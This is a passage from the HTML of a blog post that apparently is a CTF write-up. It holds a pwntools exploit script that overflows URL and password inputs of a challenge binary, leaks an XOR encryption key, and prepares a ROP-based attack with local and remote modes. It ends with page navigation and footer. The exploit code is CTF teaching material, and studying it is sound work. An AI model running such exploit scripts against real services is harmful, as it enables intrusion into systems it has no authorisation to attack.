</span></span><span style="display:flex;"><span>    leak <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recvline()
</span></span><span style="display:flex;"><span>    leak_start <span style="color:#f92672">=</span> leak<span style="color:#f92672">.</span>find(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">128</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">128</span>
</span></span><span style="display:flex;"><span>    key <span style="color:#f92672">=</span> bytes([ <span style="color:#ae81ff">0x41</span> <span style="color:#f92672">^</span> l <span style="color:#66d9ef">for</span> l <span style="color:#f92672">in</span> leak[leak_start:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]])
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvline()
</span></span><span style="display:flex;"><span>    idx <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> len(key) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">64</span>:
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#39;[*] Retrying leak&#39;</span>)
</span></span><span style="display:flex;"><span>        key <span style="color:#f92672">=</span> _leak_encryption_key(len(key), idx)
</span></span><span style="display:flex;"><span>        idx <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> key
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
</span></span><span style="display:flex;"><span>    parser <span style="color:#f92672">=</span> argparse<span style="color:#f92672">.</span>ArgumentParser()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    subparsers <span style="color:#f92672">=</span> parser<span style="color:#f92672">.</span>add_subparsers(dest<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;command&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    parser_local <span style="color:#f92672">=</span> subparsers<span style="color:#f92672">.</span>add_parser(<span style="color:#e6db74">&#39;local&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    parser_remote <span style="color:#f92672">=</span> subparsers<span style="color:#f92672">.</span>add_parser(<span style="color:#e6db74">&#39;remote&#39;</span>)
</span></span><span style="display:flex;"><span>    parser_remote<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#39;host&#39;</span>)
</span></span><span style="display:flex;"><span>    parser_remote<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#39;port&#39;</span>, type<span style="color:#f92672">=</span>int)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#39;-b&#39;</span>, <span style="color:#e6db74">&#39;--binary&#39;</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;local binary path&#39;</span>, required<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
</span></span><span style="display:flex;"><span>    parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#39;-l&#39;</span>, <span style="color:#e6db74">&#39;--libc&#39;</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;local libc path&#39;</span>, required<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>) <span style="color:#75715e"># remove if libc not needed</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    args <span style="color:#f92672">=</span> parser<span style="color:#f92672">.</span>parse_args()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>command <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;local&#39;</span>:
</span></span><span style="display:flex;"><span>        p <span style="color:#f92672">=</span> process(args<span style="color:#f92672">.</span>binary)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> args<span style="color:#f92672">.</span>command <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;remote&#39;</span>:
</span></span><span style="display:flex;"><span>        p <span style="color:#f92672">=</span> remote(args<span style="color:#f92672">.</span>host, args<span style="color:#f92672">.</span>port)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        parser<span style="color:#f92672">.</span>print_help()
</span></span><span style="display:flex;"><span>        exit(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    binary <span style="color:#f92672">=</span> ELF(args<span style="color:#f92672">.</span>binary)
</span></span><span style="display:flex;"><span>    libc <span style="color:#f92672">=</span> ELF(args<span style="color:#f92672">.</span>libc)
</span></span><span style="display:flex;"><span>    rop <span style="color:#f92672">=</span> ROP(binary)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    url <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;http://&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">128</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;:&#39;</span>
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#39;[+] Creating malformed entry&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;URL: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(url)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Password: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">64</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#39;[+] Leaking encryption key&#39;</span>)
</span></span><span style="display:flex;"><span>    key <span style="color:#f92672">=</span> leak_encryption_key()
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">assert</span> len(key) <span style="color:#f92672">==</span> <span style="color:#ae81ff">64</span>
</span></span><span style="display:flex;"><span>    print(key)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    gdb<span style="color:#f92672">.</span>attach(p)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    input(<span style="color:#e6db74">&#39;[Type ENTER to continue]&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;URL: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(url)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Password: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">255</span>) <span style="color:#75715e"># make program crash if no null byte while reading</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;2&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#p.recvuntil(b&#39;Password: &#39;)</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#leak = u64(p.recvline().replace(b&#39;A&#39;*128, b&#39;&#39;).ljust(8, b&#39;\x00&#39;))</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#print(hex(leak))</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div>
      </div></div>

  
    
<div class="pagination">
  <div class="pagination__title">
    <span class="pagination__title-h">Read other posts</span>
    <hr />
  </div>
  <div class="pagination__buttons">
    
    
    
      <a href="//localhost:1313/posts/ctf-thm-hackfinity-2025/" class="button inline next">
        Ctf Thm Hackfinity 2025
      </a>
    
  </div>
</div>


  

  
    

  
</article>

  </div>

  
    <footer class="footer">
  <div class="footer__inner">
    
      <div class="copyright">
        <span>Â© 2025 Powered by <a href="https://gohugo.io">Hugo</a></span>
    
      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
      </div>
  </div>
</footer>






<script type="text/javascript" src="/bundle.min.js"></script>





  
</div>

</body>
</html>
